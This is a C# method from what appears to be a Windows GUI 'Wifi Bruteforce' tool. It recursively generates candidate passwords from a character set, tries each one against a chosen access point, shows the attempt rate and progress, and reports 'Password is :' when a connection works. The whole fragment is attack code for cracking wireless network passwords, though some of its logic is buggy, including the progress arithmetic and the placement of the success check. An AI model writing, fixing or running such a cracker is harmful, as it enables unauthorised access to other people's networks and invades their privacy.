     private void bruteforce(char[] fin, String pwd, int pos, int length, AccessPoint selectedAP)
        {
            timer1.Start();
            sw.Start();
            if (pos < length)
            {
                foreach (char ch in fin)
                {
                    bruteforce(fin, pwd + ch, pos + 1, length, selectedAP);
                    elapsedSec = Convert.ToInt32(sw.Elapsed.TotalSeconds);
                    // Auth
                    AuthRequest authRequest = new AuthRequest(selectedAP);
                    bool overwrite = true;
                    if (authRequest.IsPasswordRequired)
                    {
                        if (overwrite)
                        {
                            if (authRequest.IsUsernameRequired)
                            {
                                Console.Write("\r\nPlease enter a username: ");
                                authRequest.Username = Console.ReadLine();
                            }
                            authRequest.Password = pwd;
                            if (authRequest.IsDomainSupported)
                            {
                                Console.Write("\r\nPlease enter a domain: ");
                                authRequest.Domain = Console.ReadLine();
                            }
                        }
                    }
                    selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
                }
				
				
				
				try
                {
                    SetControlPropertyThreadSafe(label4, "Text", pwd);
                    SetControlPropertyThreadSafe(label5, "Text", count.ToString());
                    count++;
                    speed = count / elapsedSec;
                    SetControlPropertyThreadSafe(label23, "Text", speed + " passwords/s");
                    passwordLeft = (int)permutations - count;
                    estimatedTime = speed * (int)permutations - passwordLeft * speed;
                    SetControlPropertyThreadSafe(progressBar1, "Maximum", (int)permutations);
                    SetControlPropertyThreadSafe(progressBar1, "Value", estimatedTime);
                    SetControlPropertyThreadSafe(label30, "Text", estimatedTime.ToString() + "%");
                    if (check(selectedAP) == true && CheckForInternetConnection() == true)
                    {
                        var timeEnded = DateTime.Now;
                        SetControlPropertyThreadSafe(label4, "Text", pwd);
                        MessageBox.Show("Password is :" + pwd, "Wifi Bruteforce", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        SetControlPropertyThreadSafe(label34, "Text", timeEnded.ToString());
                        sw.Stop();
                        return;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }            
        }
